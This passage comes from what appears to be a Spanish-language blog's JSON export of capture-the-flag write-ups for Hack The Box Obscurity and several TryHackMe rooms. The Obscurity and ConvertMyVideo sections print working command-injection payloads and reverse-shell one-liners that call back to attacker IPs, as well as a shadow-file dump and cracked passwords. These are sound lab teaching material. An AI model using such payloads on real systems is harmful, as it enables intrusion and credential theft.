descubrimos una vulnerabilidad la cual nos dio acceso con un pequeño script en Python. Encontramos un script que nos ayudó a obtener las credenciales del siguiente usuario. Finalmente un script que obtiene el contenido de /etc/shadow nos permitio crackear la contraseña del usuario root para escalar privilegios.\nInformacion de la Maquina Nombre Obscurity OS Linux Puntos 30 Dificultad Media IP 10.10.10.168 Maker clubby789\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[5.7, 4, 3.2, 6.8, 6],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[8, 4, 2, 8, 6],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} NMAP Escaneo de puertos tcp/udp y servicios con masscan y nmap.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 # Nmap 7.80 scan initiated Wed Jan 8 20:18:09 2020 as: nmap -p- --min-rate 1000 -sV -sC -o nmap_scan 10.10.10.168 Nmap scan report for 10.10.10.168 Host is up (0.27s latency). Not shown: 65531 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 33:d3:9a:0d:97:2c:54:20:e1:b0:17:34:f4:ca:70:1b (RSA) | 256 f6:8b:d5:73:97:be:52:cb:12:ea:8b:02:7c:34:a3:d7 (ECDSA) |_ 256 e8:df:55:78:76:85:4b:7b:dc:70:6a:fc:40:cc:ac:9b (ED25519) 80/tcp closed http 8080/tcp open http-proxy BadHTTPServer | fingerprint-strings: | GetRequest: | HTTP/1.1 200 OK | Date: Thu, 09 Jan 2020 02:23:51 | Server: BadHTTPServer | Last-Modified: Thu, 09 Jan 2020 02:23:51 | Content-Length: 4171 | Content-Type: text/html | Connection: Closed | \u0026lt;!DOCTYPE html\u0026gt; | \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; | \u0026lt;title\u0026gt;0bscura\u0026lt;/title\u0026gt; | \u0026lt;meta http-equiv=\u0026#34;X-UA-Compatible\u0026#34; content=\u0026#34;IE=Edge\u0026#34;\u0026gt; | \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1\u0026#34;\u0026gt; | \u0026lt;meta name=\u0026#34;keywords\u0026#34; content=\u0026#34;\u0026#34;\u0026gt; | \u0026lt;meta name=\u0026#34;description\u0026#34; content=\u0026#34;\u0026#34;\u0026gt; | \u0026lt;!-- | Easy Profile Template | http://www.templatemo.com/tm-467-easy-profile | \u0026lt;!-- stylesheet css --\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;css/bootstrap.min.css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;css/font-awesome.min.css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;css/templatemo-blue.css\u0026#34;\u0026gt; | \u0026lt;/head\u0026gt; | \u0026lt;body data-spy=\u0026#34;scroll\u0026#34; data-target=\u0026#34;.navbar-collapse\u0026#34;\u0026gt; | \u0026lt;!-- preloader section --\u0026gt; | \u0026lt;!-- | \u0026lt;div class=\u0026#34;preloader\u0026#34;\u0026gt; | \u0026lt;div class=\u0026#34;sk-spinner sk-spinner-wordpress\u0026#34;\u0026gt; | HTTPOptions: | HTTP/1.1 200 OK | Date: Thu, 09 Jan 2020 02:23:52 | Server: BadHTTPServer | Last-Modified: Thu, 09 Jan 2020 02:23:52 | Content-Length: 4171 | Content-Type: text/html | Connection: Closed | \u0026lt;!DOCTYPE html\u0026gt; | \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; | \u0026lt;title\u0026gt;0bscura\u0026lt;/title\u0026gt; | \u0026lt;meta http-equiv=\u0026#34;X-UA-Compatible\u0026#34; content=\u0026#34;IE=Edge\u0026#34;\u0026gt; | \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1\u0026#34;\u0026gt; | \u0026lt;meta name=\u0026#34;keywords\u0026#34; content=\u0026#34;\u0026#34;\u0026gt; | \u0026lt;meta name=\u0026#34;description\u0026#34; content=\u0026#34;\u0026#34;\u0026gt; | \u0026lt;!-- | Easy Profile Template | http://www.templatemo.com/tm-467-easy-profile | \u0026lt;!-- stylesheet css --\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;css/bootstrap.min.css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;css/font-awesome.min.css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;css/templatemo-blue.css\u0026#34;\u0026gt; | \u0026lt;/head\u0026gt; | \u0026lt;body data-spy=\u0026#34;scroll\u0026#34; data-target=\u0026#34;.navbar-collapse\u0026#34;\u0026gt; | \u0026lt;!-- preloader section --\u0026gt; | \u0026lt;!-- | \u0026lt;div class=\u0026#34;preloader\u0026#34;\u0026gt; |_ \u0026lt;div class=\u0026#34;sk-spinner sk-spinner-wordpress\u0026#34;\u0026gt; |_http-server-header: BadHTTPServer |_http-title: 0bscura 9000/tcp closed cslistener 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port8080-TCP:V=7.80%I=7%D=1/8%Time=5E168E70%P=x86_64-pc-linux-gnu%r(Get [ ... snip ... ] SF:-spinner\\x20sk-spinner-wordpress\\\u0026#34;\u0026gt;\\n\u0026#34;); Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Jan 8 20:24:22 2020 -- 1 IP address (1 host up) scanned in 373.38 seconds HTTP En el puerto 8080 encontramos una pagina web, la cual contiene informacion sobre una empresa.\nEn la parte de abajo encontramos un mensaje dirigido a los desarrolladores, dando a entender que en el directorio secreto se encuentra el codigo fuente de la pagina.\nWFUZZ Utilizamos wfuzz para encontrar el archivo \u0026lsquo;SuperSecureServer.py\u0026rsquo;.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 root@aoiri:~/htb/obscurity# wfuzz -u http://10.10.10.168:8080/FUZZ/SuperSecureServer.py -w /usr/share/wordlists/dirb/common.txt --hc 404 Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz\u0026#39;s documentation for more information. ******************************************************** * Wfuzz 2.4 - The Web Fuzzer * ******************************************************** Target: http://10.10.10.168:8080/FUZZ/SuperSecureServer.py Total requests: 4614 =================================================================== ID Response Lines Word Chars Payload =================================================================== 000001245: 200 170 L 498 W 5892 Ch \u0026#34;develop\u0026#34; Total time: 116.5698 Processed Requests: 4614 Filtered Requests: 4613 Requests/sec.: 39.58142 Encontramos el archivo \u0026lsquo;SuperSecureServer.py\u0026rsquo; del servidor.\nRCE - SuperSecureServer.py Analizamos el codigo del archivo y encontramos una vulnerabilidad la cual se encuentra al realizar una consulta a de un directorio. Al pasarle un directorio (\u0026lsquo;directorioABC\u0026rsquo;) entre comillas, este elimina las comillas, pasa por la funcion exec() y se utiliza el directorio como una variable en un string, en el caso de que no haya errores sigue ejecutandose el codigo.\nCodigo vulnerable:\n1 2 3 4 path = urllib.parse.unquote(path) try: info = \u0026#34;output = \u0026#39;Document: {}\u0026#39;\u0026#34; # Keep the output for later debug exec(info.format(path)) # This is how you do string formatting, right? Utilizamos el siguiente payload para ejecutar comandos:\n1 \u0026#39;\\\u0026#39;\\n\\nos.system(\u0026#34; COMANDO \u0026#34;)\\n #\u0026#34;\u0026#39; Realizamos pruebas haciendo una consultas DNS a nuestra maquina:\n1 cmd = \u0026#39;\\\u0026#39;\\n\\nos.system(\u0026#34;nslookup $PATH 10.10.15.122\u0026#34;)\\n #\u0026#34;\u0026#39; Ejecutamos una shell inversa y obtenemos acceso con el usuario www-data:\nCodigo:\n1 2 3 4 5 6 7 8 9 10 11 12 import requests import urllib #cmd = \u0026#39;\\\u0026#39;\\n\\nos.system(\u0026#34; COMMAND \u0026#34;)\\n #\u0026#34;\u0026#39; #cmd = \u0026#39;\\\u0026#39;\\n\\nos.system(\u0026#34;nslookup $(which nc) 10.10.14.14\u0026#34;)\\n #\u0026#34;\u0026#39; cmd = \u0026#39;\\\u0026#39;\\n\\nos.system(\u0026#34; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.10.14.14 1336 \u0026gt;/tmp/f \u0026#34;)\\n #\u0026#34;\u0026#39; path = urllib.parse.quote(cmd, safe=\u0026#39;\u0026#39;) print(path) url = \u0026#34;http://obscure.htb:8080/\u0026#34;+path r = requests.get(url) USER - Robert Enumeramos la carpeta principal del usuario robert, encontramos varios archivos, un script en python que encripta/desencripta archivos utilizando una clave.\nTambien vemos archivos en texto plano, pero dos de ellos parecen estar encriptados por el script.\nAl ejecutar el script nos muestra los parametros que necesita para encriptar y desencriptar un archivo.\n1 2 3 4 5 6 7 8 9 10 11 12 13 www-data@obscure:/home/robert$ python3 SuperSecureCrypt.py -h python3 SuperSecureCrypt.py -h usage: SuperSecureCrypt.py [-h] [-i InFile] [-o OutFile] [-k Key] [-d] Encrypt with 0bscura\u0026#39;s encryption algorithm optional arguments: -h, --help show this help message and exit -i InFile The file to read -o OutFile Where to output the encrypted/decrypted file -k Key Key to use -d Decrypt mode www-data@obscure:/home/robert$ Utilizamos dicho script para poder desencriptar el archivo out.txt con el archivo check.txt como clave para obtener la clave de encriptacion:\n1 python3 SuperSecureCrypt.py -i out.txt -o /tmp/what.txt -k \u0026#34;$(cat check.txt)\u0026#34; -d Utilizamos la clave para poder desencriptar el archivo out.txt y vemos que es el mismo mensaje que el archivo check.txt tiene, por lo que ya tenemos la clave:\n1 python3 SuperSecureCrypt.py -i out.txt -o /tmp/what2.txt -k \u0026#34;alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovich\u0026#34; -d Utilizamos la clave para desencriptar el archivo passwordreminder.txt:\n1 python3 SuperSecureCrypt.py -i passwordreminder.txt -o /tmp/what3.txt -k \u0026#34;alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovich\u0026#34; -d Obtenemos una contraseña, utilizamos la contraseña con el usuario robert y obtenemos una shell y nuestra flag user.txt:\nrobert:SecThruObsFTW PRIVILEGE ESCALATION Enumeramos los comandos que pueden ser ejecutados con privilegios de root sin contraseña, encontramos un script en python.\nDicho script pregunta por usuario y su contraseña existentes en la maquina, lee /etc/shadow y escribe su contenido en /tmp/SSH/, solo si las credenciales dadas corresponden a uno de los usuarios, el script ejecuta los comandos que se le pasen y elimina el archivo creado en /tmp/SSH/.\nYa que tenemos un usuario con sus credenciales ejecutamos el script pasando el usuario robert y la contraseña SecThruObsFTW, al hacer esto se escribira en /tmp/SSH/ las contraseñas encriptadas de la maquina.\n1 /usr/bin/sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py Al mismo tiempo en otra shell utilizamos watch para ver los cambios que hay en /tmp/SSH/ obteniendo con cat el archivo temporal de las contraseñas.\n1 watch -t -d -g -n 0.1 \u0026#34;cat /tmp/SSH/* |base64 \u0026gt; /tmp/b.txt \u0026#34; Obtenemos el hash del usuario root y robert, utilizamos John The Ripper para desencriptar la contraseña.\nObtenemos la contraseña, una shell con privilegios root y nuestra flag root.txt.\nroot:mercedes\n","description":"Obscurity tiene expuesto el codigo fuente de la aplicacion web, descubrimos una vulnerabilidad la cual nos dio acceso con un pequeño script en Python. Encontramos un script que nos ayudó a obtener las credenciales del siguiente usuario. Finalmente un script que obtiene el contenido de /etc/shadow nos permitio crackear la contraseña del usuario root para escalar privilegios.","id":139,"section":"posts","tags":["exec","DNS exfil"],"title":"Hack The Box - Obscurity","uri":"https://sckull.github.io/posts/obscurity/"},{"content":"\rCicada-3301 Vol:1 es una maquina de TryHackMe basada en la organizacion Cicada 3301, es una serie de retos, mayormente de Esteganografia, Hash Cracking y Scripting.\nRoom Titulo Cicada-3301 Vol:1 Descripción A basic steganography and cryptography challenge room based on the Cicada 3301 challenges Puntos 148 Dificultad Media Maker Cryillic Analyze The Audio Al inicio tenemos un archivo de audio (3301.wav) al cual le añadimos una capa de espectrograma utilizando Sonic Visualiser.\nNos devuelve una imagen QR el cual obtuvimos una URL utilizando el Lector QR inlite.\nDecode the Passphrase Una URL hacia Pastebin.\nUtilizamos CyberChef para poder decodificar la frase y la clave en base64.\nUtilizamos Vigenere para poder codificar nuevamente (como el reto lo indica) con la clave que encontramos a la frase decodificada.\nGather Metadata Utilizamos la frase que codificamos para extraer el archivo dentro de la imagen welcome.jpg, y nos da una url de una image.\nLa imagen de la URL.\nFind Hidden Files En este Task intentamos con muchas herramientas de esteganografia y encontramos la correcta, Outguess para poder obtener la informacion (archivo) dentro de la imagen.\nEn el mensaje nos indica que debemos de romper el hash para poder encontrar el libro.Tambien una combinacion de letras y numeros y que debemos de ir hacia delante si el numero es positivo, y hacia atras si el numero es negativo.\nEl hash:\nb6atryhackmetryhackmetryhackmetryhackmetryhackmetryhackmetryhackmetryhackmetryhackmetryhackmetryhackmetryhackmetryhackme348 Verificamos que tipo de hash es y vemos que es SHA2-512.\nUtilizamos https://md5hashing.net para poder obtener el texto el cual es una URL a pastebin.\nBook Cipher La URL de pastebin contiene lo que parece ser el capitulo de un libro.\nRecordemos el nombre del challenge Cicada 3301, investigamos acerca del reto, especificamente de la solucion, y encontramos que el reto se parece bastante a Cicada 3301 - The Book Cipher, por lo que utilizamos el ejemplo para obtener la URL para el Task 7, para ello escribimos un pequeño script en python al cual le pasamos la linea del libro y el numero de letra que debe extraer, omitimos la primera letra ya que hace referencia al Capitulo I (es el que tenemos).\nHay que mencionar que este tipo de cifrado para resolverlo se puede utilizar la sintaxis siguiente (par1:par2:par3), pueden ser numeros de pagina, linea, palabra o letra, para este reto era sencillo: linea:letra y omitimos los espacios ya que devuelve un valor distinto.\nTambien, este cifrado para resolverlo comenzamos desde la primera letra de la Oracion y no de la linea, en el caso de los numeros negativos vamos hacia atras de la oracion como nos indicaba el mensaje.\nSpoiler El script: Script.py\nAl resolverlo por completo nos devuelve una URL acortada que nos redirige a soundcloud.\nThe Final Song Ingresar el Nombre de la Cancion encontrada.\n","description":"Cicada-3301 Vol:1 es una maquina de TryHackMe basada en la organizacion Cicada 3301, es una serie de retos, mayormente de Esteganografia, Hash Cracking y Scripting. ","id":140,"section":"posts","tags":["steganography","vigenere"],"title":"TryHackMe - Cicada-3301 Vol:1","uri":"https://sckull.github.io/posts/cicada3301vol1/"},{"content":"\rConvertMyVideo es una maquina de TryHackMe, encontramos que Youtube-dl esta siendo ejecutado en la pagina, realizamos Command Injection donde obtuvimos credenciales de acceso para el panel de administracion para luego ejecutar shell inversa. Finalmente ejecutamos una shell inversa con un cronjob para escalar privilegios.\nRoom Titulo ConvertMyVideo Descripción My Script to convert videos to MP3 is super secure Puntos 320 Dificultad Media Maker overjt NMAP Escaneo de puertos tcp, nmap nos muestra el puerto http (80) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 # Nmap 7.80 scan initiated Tue May 5 19:02:47 2020 as: nmap -sV -o nmap_scan_mini convertmyvideo.thm Nmap scan report for convertmyvideo.thm (10.10.1.154) Host is up (0.19s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue May 5 19:03:30 2020 -- 1 IP address (1 host up) scanned in 43.02 seconds HTTP Encontramos una pagina sencilla en el puerto 80, en la que nos muestra un formulario en donde nos pide un ID de un video de YouTube.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7 8 root@upset:~/thm/convertmyvideo# gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://convertmyvideo.thm/ -q -t 25 -x php,html,txt /admin (Status: 401) /images (Status: 301) /index.php (Status: 200) /index.php (Status: 200) /js (Status: 301) /server-status (Status: 403) /tmp (Status: 301) Dentro del codigo fuente de la pagina encontramos el codigo de envio del ID en Javascript, el cual envia la URL de youtube añadiendole el ID.\nUtilizamos Burpsuite para capturar el envio de el ID, le agregamos un ID erroneo y nos da una respuesta en el que nos devuelve el error que se generó.\nCOMMAND INJECTION Eliminamos la URL y enviamos algo diferente, y vemos que el mensaje de error contiene el nombre de una herramienta que se utiliza para descargar videos de YouTube - youtube-dl.\nPara verificar que esa herramienta esta siendo utilizada con la pagina, enviamos la flag --help para confirmar que es esa herramienta, y nos devolvió todas las opciones.\nAl parecer la pagina esta utilizando youtube-dl para pasarle la url con el ID que ingresamos, mediante la ejecucion de la herramienta a traves de consola. Intentamos romper este comando y sus parametros, utilizamos command injection, con | y el comando id más el separador ; (punto y coma) esto para separar y no ejecutar los parametros adicionales. Logramos ejecutar el comando.\nAhora que podemos ejecutar comandos, comenzamos a enumerar los archivos que estan en la maquina, vemos que la direccion donde estamos es en /var/www/html y los archivos que se encuentran en esa direccion.\nLogramos obtener el codigo fuente de index.php utilizando cat{$IFS}index.php (utilizamos {$IFS} para agregar espacios).\nVemos en el codigo fuente que ejecuta el comando youtube-dl con sus parametros y en medio pasa la URL que es ingresada por el usuario.\nVemos la carpeta de admin, la cual contiene un index.php y flag.txt.\nIntentamos realizar cat a la flag.txt y obtenemos la primera.\nEnumeramos la carpeta nuevamente con mas profundidad y econtramos el archivo .htaccess.\nEjecucion de Comando\n1 2 3 4 5 6 7 8 9 10 total 36 drwxr-xr-x 6 www-data www-data 4096 Apr 12 04:42 . drwxr-xr-x 3 root root 4096 Apr 12 01:07 .. -rw-r--r-- 1 www-data www-data 152 Apr 12 03:58 .htaccess drwxr-xr-x 2 www-data www-data 4096 Apr 12 05:05 admin drwxrwxr-x 2 www-data www-data 4096 Apr 12 04:26 images -rw-r--r-- 1 www-data www-data 1790 Apr 12 04:55 index.php drwxrwxr-x 2 www-data www-data 4096 Apr 12 04:44 js -rw-rw-r-- 1 www-data www-data 205 Apr 12 04:40 style.css drwxr-xr-x 2 www-data www-data 4096 Apr 12 05:13 tmp El archivo contiene lo siguiente y al parecer hay un archivo .htpasswd en la carpeta admin.\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;Files /admin/.htpasswd\u0026gt; Order allow,deny Deny from all \u0026lt;/Files\u0026gt; \u0026lt;Files /admin/.htaccess\u0026gt; Order allow,deny Deny from all \u0026lt;/Files\u0026gt; Options -Indexes Hacemos cat al archivo y logramos obtener un usuario y contraseña encriptada.\nUtilizamos john para obtener la contraseña.\nIngresamos a la pagina utilizando el panel de /admin y vemos un boton que al presionarlo realiza la ejecucion de un comando.\nVemos que podemos ejecutar comandos:\nUSER - WWW-DATA Utilizamos python para ejecutar nuestra shell inversa y ponemos a la escucha nuestro netcat.\n1 python -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;10.18.1.160\u0026#34;,1338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;]);\u0026#39; Logramos obtener una shell con usuario www-data\nPRIVILEGE ESCALATION Mediante una enumeracion basica de binarios no encontramos alguno que nos puediera ayudar, utilizamos pspy para ver si existe algun cronjob en la maquina. Encontramos que se ejecuta un cronjob el cual ejecuta el archivo clean.sh que se encuentra en /var/www/html/tmp/.\nAgregamos una shell inversa a este archivo y pusimos a la escucha netcat, logramos obtener una shell con usuario root y nuestra flag root.txt.\n","description":"ConvertMyVideo es una maquina de TryHackMe, encontramos que Youtube-dl esta siendo ejecutado en la pagina, realizamos Command Injection donde obtuvimos credenciales de acceso para el panel de administracion para luego ejecutar shell inversa. Finalmente ejecutamos una shell inversa con un cronjob para escalar privilegios.","id":141,"section":"posts","tags":["cron","command injection","john"],"title":"TryHackMe - ConvertMyVideo","uri":"https://sckull.github.io/posts/convertmyvideo/"},{"content":"\rNax es una maquina de TryHackMe, resolvimos un pequeño reto para acceder a Nagiox XI donde descubrimos una vulnerabilidad que nos dio acceso privilegiado.\nRoom Titulo Nax Descripción Identify the critical security flaw in the most powerful and trusted network monitoring software on the market, that allows an user authenticated execute remote code execution. Puntos 490 Dificultad Media Maker stuxnet NMAP Escaneo de puertos tcp, nmap nos muestra el puerto http (80), ldap (389) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 # Nmap 7.80 scan initiated Tue May 5 00:26:26 2020 as: nmap -sV -o nmap_scan_mini nax.thm Nmap scan report for nax.thm (10.10.253.17) Host is up (0.26s latency). Not shown: 995 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) 25/tcp open smtp Postfix smtpd 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) 389/tcp open ldap OpenLDAP 2.2.X - 2.3.X 443/tcp open ssl/ssl Apache httpd (SSL-only mode) Service Info: Host: ubuntu.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue May 5 00:27:33 2020 -- 1 IP address (1 host up) scanned in 67.23 seconds # Nmap 7.80 scan initiated Tue May 5 00:27:36 2020 as: nmap -T5 -sV -sC -p- -o nmap_scan nax.thm Warning: 10.10.253.17 giving up on port because retransmission cap hit (2). Nmap scan report for nax.thm (10.10.253.17) Host is up (0.18s latency). Not shown: 65358 closed ports, 171 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 62:1d:d9:88:01:77:0a:52:bb:59:f9:da:c1:a6:e3:cd (RSA) | 256 af:67:7d:24:e5:95:f4:44:72:d1:0c:39:8d:cc:21:15 (ECDSA) |_ 256 20:28:15:ef:13:c8:9f:b8:a7:0f:50:e6:2f:3b:1e:57 (ED25519) 25/tcp open smtp Postfix smtpd |_smtp-commands: ubuntu.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, | ssl-cert: Subject: commonName=ubuntu | Not valid before: 2020-03-23T23:42:04 |_Not valid after: 2030-03-21T23:42:04 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Site doesn\u0026#39;t have a title (text/html). 389/tcp open ldap OpenLDAP 2.2.X - 2.3.X 443/tcp open ssl/ssl Apache httpd (SSL-only mode) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: 400 Bad Request | ssl-cert: Subject: commonName=192.168.85.153/organizationName=Nagios Enterprises/stateOrProvinceName=Minnesota/countryName=US | Not valid before: 2020-03-24T00:14:58 |_Not valid after: 2030-03-22T00:14:58 |_ssl-date: TLS randomness does not represent time | tls-alpn: |_ http/1.1 5667/tcp open tcpwrapped Service Info: Host: ubuntu.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue May 5 00:42:16 2020 -- 1 IP address (1 host up) scanned in 879.93 seconds GOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7 8 9 10 11 root@upset:~/thm/nax# gobuster dir -u http://nax.thm/ -w /usr/share/wordlists/dirb/common.txt -t 25 -q -x php,html,txt /cgi-bin/ (Status: 403) /cgi-bin/.php (Status: 403) /cgi-bin/.html (Status: 403) /index.html (Status: 200) /index.php (Status: 200) /index.html (Status: 200) /index.php (Status: 200) /javascript (Status: 301) /nagios (Status: 401) /server-status (Status: 403) HTTP Encontramos una pagina simple en el puerto 80 y en el codigo fuente encontramos una direccion.\nGOBUSTER /nagiosxi/ Utilizamos gobuster para busqueda de directorios y archivos en /naxiosxi/.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 root@upset:~/thm/nax# gobuster dir -w /usr/share/wordlists/dirb/common.txt -t 25 -q -x php,html,txt -u http://nax.thm/nagiosxi/ /about (Status: 301) /account (Status: 301) /admin (Status: 301) /api (Status: 301) /backend (Status: 301) /config (Status: 301) /db (Status: 301) /help (Status: 301) /images (Status: 301) /includes (Status: 301) /index.php (Status: 302) /index.php (Status: 302) /install.php (Status: 302) /login.php (Status: 200) /reports (Status: 301) /tools (Status: 301) /upgrade.php (Status: 302) /views (Status: 301) NAGIOS XI RCE En la ruta /naxiosxi/ encontramos una plataforma la de Naxios XI, buscamos un exploit que pueda afectar esta plataforma y vemos que existe un exploit NagiosXi RCE el cual necesita un usuario y contraseña, tambien existe un exploit para metasploit nagiosxi_authenticated_rce.\nEn la pagina principal (/) encontramos una image ASCII de lo que parece ser Cicada 3301 y con algunos valores debajo de esta Ag Hg Ta Sb Po Pd Hg Pt Lr al principio intentamos utilizar un decodificador de Gematria Primus pero los valores numericos no reflejaban ningun tipo de texto o codificacion valida. Realizamos una busqueda de estos valores y encontramos que todos pertenecen a la tabla periodica, obtenemos los valores numericos de cada elemento.\n1 2 3 4 5 6 7 8 9 Ag ---\u0026gt; 47 Hg ---\u0026gt; do it yourself Ta ---\u0026gt; \u0026gt;:) Sb ---\u0026gt; do it yourself Po ---\u0026gt; \u0026gt;:) Pd ---\u0026gt; do it yourself Hg ---\u0026gt; \u0026gt;:) Pt ---\u0026gt; do it yourself Lr ---\u0026gt; 103 Al obtener estos valores lo decodificamos de hex a texto plano y encontramos una direccion de un archivo.\nAl visitar la direccion del archivo vemos que es una imagen que tiene texto codificado y utiliza la codificacion de piet.\nAl decodificar la imagen nos devuelve una cadena de caracteres.\nLogramos obtener un usuario y contraseña, verificamos que funcionan en la plataforma ingresando con las credenciales.\nUtilizamos estas credenciales con el exploit que encontramos para Naxios (El exploit me dio algunos errores por lo que tuve que agregar la contraseña directamente al codigo).\nEjecutamos el exploit y ponemos a la escucha netcat, y logramos obtener una shell.\nNuestra shell ya tiene privilegios root por lo que no es necesario escalar privilegios, y logramos obtener nuestra flag user.txt y root.txt.\nMetasploit - NagiosXi RCE Utilizamos el exploit disponible para metasploit y funciona muy bien.\n","description":"Nax es una maquina de TryHackMe, resolvimos un pequeño reto para acceder a Nagiox XI donde descubrimos una vulnerabilidad que nos dio acceso privilegiado.","id":142,"section":"posts","tags":["nagiox xi","steganography","metasploit"],"title":"TryHackMe - Nax","uri":"https://sckull.github.io/posts/nax/"},{"content":"\rTomGhost es una maquina de TryHackMe. Identificamos una vulnerabilidad en Tomcat para leer las credenciales de esta misma plataforma, lo que nos permitio acceder por SSH donde luego encontramos un archivo encriptado y, que, con la ayuda de John obtuvimos la contraseña para un segundo usuario. Escalamos privilegios utilizando Sudo con Zp e informacion de GTFOBins.\nRoom Titulo tomghost Descripción Identify recent vulnerabilities to try exploit the system or read files that you should not have access to. Puntos 810 Dificultad Facil Maker stuxnet NMAP Escaneo de puertos tcp, nmap nos muestra el puerto http (8080), ajp13 (8009) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 # Nmap 7.80 scan initiated Mon May 4 21:55:03 2020 as: nmap -sV -o nmap_scan_mini tomgost.thm Nmap scan report for tomgost.thm (10.10.190.132) Host is up (0.22s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 